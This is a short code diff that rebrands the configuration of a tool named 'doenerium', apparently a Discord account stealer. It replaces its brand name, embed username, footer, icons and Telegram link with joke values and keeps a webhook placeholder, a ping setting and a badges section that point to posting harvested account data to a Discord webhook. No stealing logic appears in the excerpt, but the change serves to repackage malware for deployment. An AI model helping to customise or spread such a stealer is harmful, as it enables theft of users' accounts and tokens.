@@ -11,7 +11,7 @@ const fs = require("fs");
 // Initialization
 
 var config = {
-    brand: "doenerium",
+    brand: "owned bruh",
 
     webhook: "REPLACE_ME",
 
@@ -23,13 +23,13 @@ var config = {
     ping: [true, "@doener"],
 
     embed: {
-        username: "doenerium | t.me/doenerium",
+        username: "owna pouco",
         footer: {
-            text: `doenerium | t.me/doenerium`,
-            icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
+            text: `good`,
+            icon_url: "https://i.pinimg.com/236x/fa/80/bd/fa80bd270903b3e5b1fc2ca6d7c026cc.jpg",
         },
-        href: "https://t.me/doenerium",
-        avatar_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless"
+        href: "my aggs",
+        avatar_url: "https://i.pinimg.com/236x/fa/80/bd/fa80bd270903b3e5b1fc2ca6d7c026cc.jpg"
     },
 
     badges: {
